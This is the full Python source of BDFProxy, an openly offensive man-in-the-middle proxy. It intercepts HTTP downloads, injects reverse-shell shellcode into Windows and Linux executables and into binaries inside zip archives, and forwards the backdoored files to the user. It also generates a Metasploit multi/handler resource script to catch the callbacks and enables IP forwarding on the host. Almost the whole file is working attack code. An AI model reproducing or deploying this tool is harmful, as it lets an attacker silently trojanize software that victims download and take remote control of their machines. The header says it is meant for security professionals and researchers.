#!/usr/bin/env python
"""
    BackdoorFactory Proxy (BDFProxy) v0.1 - 'Indifferent Pronoun'

    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com

    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win86/64 PE and linux86/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.

    Tested on Kali-Linux.

"""

from libmproxy import controller, proxy, platform
from tempfile import mkstemp
import os
from bdf import pebin
from bdf import elfbin
import string
import random
import zipfile
import shutil
import sys
import pefile
import logging
import json

try:
    from configobj import ConfigObj
except:
    print '[!] Install conifgobj using your favorite python package manager!'


def writeResource(resourceFile, Values):
    with open(resourceFile, 'w') as f:
        f.write("#USAGE: msfconsole -r thisscriptname.rc\n\n\n")
        writeStatement0 = "use exploit/multi/handler\n"
        writeStatement4 = "set ExitOnSession false\n\n"
        writeStatement5 = "exploit -j -z\n\n"
        for aDictionary in Values:
            if isinstance(aDictionary, dict):
                if aDictionary != {}:
                    for key, value in aDictionary.items():
                        if key == 'MSFPAYLOAD':
                            writeStatement1 = 'set PAYLOAD ' + str(value) + "\n"
                        if key == "HOST":
                            writeStatement2 = 'set LHOST ' + str(value) + "\n"
                        if key == "PORT":
                            writeStatement3 = 'set LPORT ' + str(value) + "\n"
                    f.write(writeStatement0)
                    f.write(writeStatement1)
                    f.write(writeStatement2)
                    f.write(writeStatement3)
                    f.write(writeStatement4)
                    f.write(writeStatement5)


def dictParse(d):
    tmpValues = {}
    for key, value in d.iteritems():
        if isinstance(value, dict):
            dictParse(value)
        if key == 'HOST':
            tmpValues['HOST'] = value
        if key == 'PORT':
            tmpValues['PORT'] = value
        if key == 'MSFPAYLOAD':
            tmpValues['MSFPAYLOAD'] = value

    resourceValues.append(tmpValues)


class proxyMaster(controller.Master):

    def __init__(self, server):
        controller.Master.__init__(self, server)
        #FOR FUTURE USE
        self.binaryMimeTypes = (["application/octet-stream"], ['application/x-msdownload'],
                                ['application/x-msdos-program'], ['binary/octet-stream'],
                                )
        #FOR FUTURE USE
        self.zipMimeTypes = (['application/x-zip-compressed'], ['application/zip'])

        #USED NOW
        self.supportedBins = ('MZ', '7f454c46'.decode('hex'))

    def run(self):
        try:
            return controller.Master.run(self)
            logging.debug("Starting ")

        except KeyboardInterrupt:
            self.shutdown()

    def zip_files(self, aZipFile):
        "When called will unpack and edit a Zip File and return a zip file"

        print "[*] ZipFile size:", len(aZipFile) / 1024, 'KB'

        if len(aZipFile) > int(self.userConfig['ZIP']['maxSize']):
            print "[!] ZipFile over allowed size"
            logging.info("ZipFIle maxSize met %s", len(aZipFile))
            return aZipFile

        tmpRan = ''.join(random.choice(string.ascii_lowercase + string.digits + string.ascii_uppercase) for _ in range(8))
        tmpDir = '/tmp/' + tmpRan
        tmpFile = '/tmp/' + tmpRan + '.zip'

        os.mkdir(tmpDir)

        with open(tmpFile, 'w') as f:
            f.write(aZipFile)

        zippyfile = zipfile.ZipFile(tmpFile, 'r')

        #encryption test
        try:
            zippyfile.testzip()

        except RuntimeError as e:
            if 'encrypted' in str(e):
                logging.info('Encrypted zipfile found. Not patching.')
                return aZipFile

        print "[*] ZipFile contents and info:"

        for info in zippyfile.infolist():
            print "\t", info.filename, info.date_time, info.file_size

        zippyfile.extractall(tmpDir)

        patchCount = 0

        for info in zippyfile.infolist():
            print "[*] >>> Next file in zipfile:", info.filename

            if os.path.isdir(tmpDir + '/' + info.filename) is True:
                print info.filename, 'is a directory'
                continue

            #Check against keywords
            keywordCheck = False

            if type(self.zipblacklist) is str:
                if self.zipblacklist.lower() in info.filename.lower():
                    keywordCheck = True

            else:
                for keyword in self.zipblacklist:
                    if keyword.lower() in info.filename.lower():
                        keywordCheck = True
                        continue

            if keywordCheck is True:
                print "[!] Zip blacklist enforced!"
                logging.info('Zip blacklist enforced on %s', info.filename)
                continue

            patchResult = self.binaryGrinder(tmpDir + '/' + info.filename)

            if patchResult:
                patchCount += 1
                file2 = "backdoored/" + os.path.basename(info.filename)
                print "[*] Patching complete, adding to zip file."
                shutil.copyfile(file2, tmpDir + '/' + info.filename)
                logging.info("%s in zip patched, adding to zipfile", info.filename)

            else:
                print "[!] Patching failed"
                logging.info("%s patching failed. Keeping original file in zip.", info.filename)

            print '-' * 10

            if patchCount >= int(self.userConfig['ZIP']['patchCount']):  # Make this a setting.
                logging.info("Met Zip config patchCount limit.")
                break

        zippyfile.close()

        zipResult = zipfile.ZipFile(tmpFile, 'w', zipfile.ZIP_DEFLATED)

        print "[*] Writing to zipfile:", tmpFile

        for base, dirs, files in os.walk(tmpDir):
            for afile in files:
                    filename = os.path.join(base, afile)
                    print '[*] Writing filename to zipfile:', filename.replace(tmpDir + '/', '')
                    zipResult.write(filename, arcname=filename.replace(tmpDir + '/', ''))

        zipResult.close()
        #clean up
        shutil.rmtree(tmpDir)

        with open(tmpFile, 'rb') as f:
            aZipFile = f.read()
        os.remove(tmpFile)

        return aZipFile

    def convert_to_Bool(self, aString):
        if aString.lower() == 'true':
            return True
        elif aString.lower() == 'false':
            return False
        elif aString.lower() == 'none':
            return None

    def binaryGrinder(self, binaryFile):
        """
        Feed potential binaries into this function,
        it will return the result PatchedBinary, False, or None
        """

        with open(binaryFile, 'r+b') as f:
            binaryTMPHandle = f.read()

        binaryHeader = binaryTMPHandle[:4]
        result = None

        try:
            if binaryHeader[:2] == 'MZ':  # PE/COFF
                pe = pefile.PE(data=binaryTMPHandle, fast_load=True)
                magic = pe.OPTIONAL_HEADER.Magic
                machineType = pe.FILE_HEADER.Machine

                #update when supporting more than one arch
                if (magic == int('20B', 16) and machineType == 0x8664 and
                   self.WindowsType.lower() in ['all', 'x64']):
                        add_section = False
                        cave_jumping = False
                        if self.WindowsIntelx64['PATCH_TYPE'].lower() == 'append':
                            add_section = True
                        elif self.WindowsIntelx64['PATCH_TYPE'].lower() == 'jump':
                            cave_jumping = True

                        targetFile = pebin.pebin(FILE=binaryFile,
                                                 OUTPUT=os.path.basename(binaryFile),
                                                 SHELL=self.WindowsIntelx64['SHELL'],
                                                 HOST=self.WindowsIntelx64['HOST'],
                                                 PORT=int(self.WindowsIntelx64['PORT']),
                                                 ADD_SECTION=add_section,
                                                 CAVE_JUMPING=cave_jumping,
                                                 IMAGE_TYPE=self.WindowsType,
                                                 PATCH_DLL=self.convert_to_Bool(self.WindowsIntelx64['PATCH_DLL']),
                                                 SUPPLIED_SHELLCODE=self.WindowsIntelx64['SUPPLIED_SHELLCODE'],
                                                 ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx64['ZERO_CERT']),
                                                 )

                        result = targetFile.run_this()

                elif (machineType == 0x14c and
                      self.WindowsType.lower() in ['all', 'x86']):
                        add_section = False
                        cave_jumping = False
                        #add_section wins for cave_jumping
                        #default is single for BDF
                        if self.WindowsIntelx86['PATCH_TYPE'].lower() == 'append':
                            add_section = True
                        elif self.WindowsIntelx86['PATCH_TYPE'].lower() == 'jump':
                            cave_jumping = True

                        targetFile = pebin.pebin(FILE=binaryFile,
                                                 OUTPUT=os.path.basename(binaryFile),
                                                 SHELL=self.WindowsIntelx86['SHELL'],
                                                 HOST=self.WindowsIntelx86['HOST'],
                                                 PORT=int(self.WindowsIntelx86['PORT']),
                                                 ADD_SECTION=add_section,
                                                 CAVE_JUMPING=cave_jumping,
                                                 IMAGE_TYPE=self.WindowsType,
                                                 PATCH_DLL=self.convert_to_Bool(self.WindowsIntelx86['PATCH_DLL']),
                                                 SUPPLIED_SHELLCODE=self.convert_to_Bool(self.WindowsIntelx86['SUPPLIED_SHELLCODE']),
                                                 ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx86['ZERO_CERT'])
                                                 )

                        result = targetFile.run_this()

            elif binaryHeader[:4].encode('hex') == '7f454c46':  # ELF

                targetFile = elfbin.elfbin(FILE=binaryFile, SUPPORT_CHECK=True)
                targetFile.support_check()

                if targetFile.class_type == 0x1:
                    #x86
                    targetFile = elfbin.elfbin(FILE=binaryFile,
                                               OUTPUT=os.path.basename(binaryFile),
                                               SHELL=self.LinuxIntelx86['SHELL'],
                                               HOST=self.LinuxIntelx86['HOST'],
                                               PORT=int(self.LinuxIntelx86['PORT']),
                                               SUPPLIED_SHELLCODE=self.convert_to_Bool(self.LinuxIntelx86['SUPPLIED_SHELLCODE']),
                                               IMAGE_TYPE=self.LinuxType
                                               )
                    result = targetFile.run_this()
                elif targetFile.class_type == 0x2:
                    #x64
                    targetFile = elfbin.elfbin(FILE=binaryFile,
                                               OUTPUT=os.path.basename(binaryFile),
                                               SHELL=self.LinuxIntelx64['SHELL'],
                                               HOST=self.LinuxIntelx64['HOST'],
                                               PORT=int(self.LinuxIntelx64['PORT']),
                                               SUPPLIED_SHELLCODE=self.convert_to_Bool(self.LinuxIntelx64['SUPPLIED_SHELLCODE']),
                                               IMAGE_TYPE=self.LinuxType
                                               )
                    result = targetFile.run_this()

            return result

        except Exception as e:
            print 'Exception', str(e)
            logging.warning("EXCEPTION IN binaryGrinder %s", str(e))
            return None

    def hosts_whitelist_check(self, msg):
        if self.hostwhitelist.lower() == 'all':
            self.patchIT = True

        elif type(self.hostwhitelist) is str:
            if self.hostwhitelist.lower() in msg.request.host.lower():
                self.patchIT = True
                logging.info("Host whitelist hit: %s, HOST: %s, IP: %s",
                             str(self.hostwhitelist),
                             str(msg.request.host),
                             str(msg.request.ip))

        elif msg.request.host.lower() in self.hostwhitelist.lower() or msg.request.ip in self.hostwhitelist:
            self.patchIT = True
            logging.info("Host whitelist hit: %s, HOST: %s, IP: %s",
                         str(self.hostwhitelist),
                         str(msg.request.host),
                         str(msg.request.ip))

        else:
            for keyword in self.hostwhitelist:
                if keyword.lower() in msg.requeset.host.lower():
                    self.patchIT = True
                    logging.info("Host whitelist hit: %s, HOST: %s IP: %s",
                                 str(self.hostwhitelist),
                                 str(msg.request.host),
                                 str(msg.request.ip))
                    break

    def keys_whitelist_check(self, msg):
        #Host whitelist check takes precedence
        if self.patchIT is False:
            return None

        if self.keyswhitelist.lower() == 'all':
            self.patchIT = True

        elif type(self.keyswhitelist) is str:
            if self.keyswhitelist.lower() in msg.request.path.lower() or msg.request.ip == self.keyswhitelist:
                self.patchIT = True
                logging.info("Keyword whitelist hit: %s, PATH: %s",
                             str(self.keyswhitelist), str(msg.request.path))

        elif msg.request.host.lower() in [x.lower() for x in self.keyswhitelist] or msg.request.ip in self.keyswhitelist:
            self.patchIT = True
            logging.info("Keyword whitelist hit: %s, PATH: %s",
                         str(self.keyswhitelist), str(msg.request.path))

        else:

            for keyword in self.keyswhitelist:
                if keyword.lower() in msg.requeset.path.lower():
                    self.patchIT = True
                    logging.info("Keyword whitelist hit: %s, PATH: %s",
                                 str(self.keyswhitelist), str(msg.request.path))
                    break

    def keys_backlist_check(self, msg):
        if type(self.keysblacklist) is str:

            if self.keysblacklist.lower() in msg.request.path.lower():
                self.patchIT = False
                logging.info("Keyword blacklist hit: %s, PATH: %s",
                             str(self.keysblacklist), str(msg.request.path))

        else:
            for keyword in self.keysblacklist:
                if keyword.lower() in msg.request.path.lower():
                    self.patchIT = False
                    logging.info("Keyword blacklist hit: %s, PATH: %s",
                                 str(self.keysblacklist), str(msg.request.path))
                    break

    def hosts_blacklist_check(self, msg):
        if type(self.hostblacklist) is str:

            if self.hostblacklist.lower() in msg.request.host.lower() or msg.request.ip == self.hostblacklist:
                self.patchIT = False
                logging.info("Host Blacklist hit: %s : HOST: %s, IP: %s",
                             str(self.hostblacklist), str(msg.request.host), str(msg.request.ip))

        elif msg.request.host.lower() in [x.lower() for x in self.hostblacklist] or msg.request.ip in self.hostblacklist:
            self.patchIT = False
            logging.info("Host Blacklist hit: %s : HOST: %s, IP: %s",
                         str(self.hostblacklist), str(msg.request.host), str(msg.request.ip))

        else:
            for host in self.hostblacklist:
                if host.lower() in msg.request.host.lower():
                    self.patchIT = False
                    logging.info("Host Blacklist hit: %s : HOST: %s, IP: %s",
                                 str(self.hostblacklist), str(msg.request.host), str(msg.request.ip))
                    break

    def parse_target_config(self, targetConfig):
        for key, value in targetConfig.items():
            if hasattr(self, key) is False:
                setattr(self, key, value)
                logging.debug("Settings Config %s: %s", key, value)

            elif getattr(self, key, value) != value:

                if value == "None":
                    continue

                #test if string can be easily converted to dict
                if ':' in str(value):
                    for tmpkey, tmpvalue in dict(value).items():
                        getattr(self, key, value)[tmpkey] = tmpvalue
                        logging.debug("Updating Config %s: %s", tmpkey, tmpvalue)

                else:
                    setattr(self, key, value)
                    logging.debug("Updating Config %s: %s", key, value)

    def handle_request(self, msg):
        print "*" * 10, "REQUEST", "*" * 10
        print "[*] HOST: ", msg.host
        print "[*] PATH: ", msg.path
        msg.reply()
        print "*" * 10, "END REQUEST", "*" * 10

    def handle_response(self, msg):
        #Read config here for dynamic updating
        try:
            self.userConfig = ConfigObj('bdfproxy.cfg')
            self.hostblacklist = self.userConfig['hosts']['blacklist']
            self.hostwhitelist = self.userConfig['hosts']['whitelist']
            self.keysblacklist = self.userConfig['keywords']['blacklist']
            self.keyswhitelist = self.userConfig['keywords']['whitelist']
            self.zipblacklist = self.userConfig['ZIP']['blacklist']

        except Exception as e:
            print "[!] YOUR CONFIG IS BROKEN:", str(e)
            logging.warning("[!] YOUR CONFIG IS BROKEN %s", str(e))

        print "=" * 10, "RESPONSE", "=" * 10

        print "[*] HOST: ", msg.request.host
        print "[*] PATH: ", msg.request.path

        # Below are gates from whitelist --> blacklist
        # Blacklists have the final say, but everything starts off as not patchable
        #  until a rule says True. Host whitelist over rides keyword whitelist.

        self.patchIT = False

        self.hosts_whitelist_check(msg)

        self.keys_whitelist_check(msg)

        self.keys_backlist_check(msg)

        self.hosts_blacklist_check(msg)

        if self.patchIT is False:
            print '[!] Not patching, msg did not make it through config settings'
            logging.info("Config did not allow the patching of HOST: %s, PATH: %s",
                         msg.request.host, msg.request.path)

            msg.reply()

        else:
            for target in self.userConfig['targets'].keys():
                if target == 'ALL':
                    self.parse_target_config(self.userConfig['targets']['ALL'])

                if target in msg.request.host or target == msg.request.ip:
                    self.parse_target_config(self.userConfig['targets'][target])

            if 'content-length' in msg.headers.keys():
                if int(msg.headers['content-length'][0]) >= self.FileSizeMax:
                    print "[!] Not patching over content-length, forwarding to user"
                    logging.info("Over FileSizeMax setting %s : %s", msg.request.host, msg.request.path)
                    self.patchIT = False

            #print msg.content[:2]
            #print msg.headers
            if msg.headers['content-type'] in self.zipMimeTypes and self.convert_to_Bool(self.CompressedFiles) is True:
                    aZipFile = msg.content
                    msg.content = self.zip_files(aZipFile)

            elif msg.content[:2] in self.supportedBins or msg.content[:4] in self.supportedBins:

                orgFile = msg.content

                fd, tmpFile = mkstemp()

                with open(tmpFile, 'w') as f:
                    f.write(orgFile)

                patchResult = self.binaryGrinder(tmpFile)

                if patchResult:
                    file2 = open("backdoored/" + os.path.basename(tmpFile), "rb").read()
                    msg.content = file2
                    os.remove('./backdoored/' + os.path.basename(tmpFile))
                    print "[*] Patching complete, forwarding to user."
                    logging.info("Patching complete for HOST: %s, PATH: %s", msg.request.host, msg.request.path)
                else:
                    print "[!] Patching failed"
                    logging.info("Patching failed for HOST: %s, PATH: %s", msg.request.host, msg.request.path)

                os.close(fd)

                os.remove(tmpFile)

            msg.reply()

        print "=" * 10, "END RESPONSE", "=" * 10


#Intial CONFIG reading
userConfig = ConfigObj('bdfproxy.cfg')

#################### BEGIN OVERALL CONFIGS ############################
#DOES NOT UPDATE ON THE FLY
resourceScript = userConfig['Overall']['resourceScript']
config = proxy.ProxyConfig(cacert=os.path.expanduser(userConfig['Overall']['certLocation']),
                           body_size_limit=userConfig['Overall']['MaxSizeFileRequested'],
                           )

if userConfig['Overall']['transparentProxy'] == "True":
    config.transparent_proxy = {'sslports': userConfig['Overall']['sslports'],
                                'resolver': platform.resolver()
                                }

server = proxy.ProxyServer(config, int(userConfig['Overall']['proxyPort']))

numericLogLevel = getattr(logging, userConfig['Overall']['loglevel'].upper(), None)

if not isinstance(numericLogLevel, int):
    raise ValueError("o_O: INFO, DEBUG, WARNING, ERROR, CRITICAL for loglevel in conifg")
    sys.exit()

logging.basicConfig(filename=userConfig['Overall']['logname'],
                    level=numericLogLevel,
                    format='%(asctime)s %(message)s'
                    )

#################### END OVERALL CONFIGS ##############################

#Write resource script
print "[!] Writing resource script."
resourceValues = []
dictParse(userConfig['targets'])
writeResource(str(resourceScript), resourceValues)
print "[!] Resource writen to %s" % str(resourceScript)

#configuring forwarding
try:
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
except Exception as e:
    print str(e)

m = proxyMaster(server)
print "[!] Starting BDFProxy"
logging.info("################ Starting BDFProxy ################")
logging.info("[!] ConfigDump %s", json.dumps(userConfig, sort_keys=True, indent=4))

m.run()
